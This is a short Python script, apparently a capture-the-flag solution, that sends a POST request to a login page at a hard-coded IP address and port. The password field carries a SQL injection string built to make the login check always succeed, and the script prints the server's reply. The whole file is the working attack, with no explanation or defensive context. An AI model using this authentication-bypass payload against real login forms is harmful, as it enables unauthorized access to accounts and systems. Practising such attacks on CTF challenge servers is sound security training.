import requests
url = 'http://140.115.59.7:12004/login.php'

username = "1"
password = "1'or'1'=='1"

values = {
    'ctf_username': username,
    'ctf_password': password,
    }

r = requests.post(url, data=values)
print(r.content)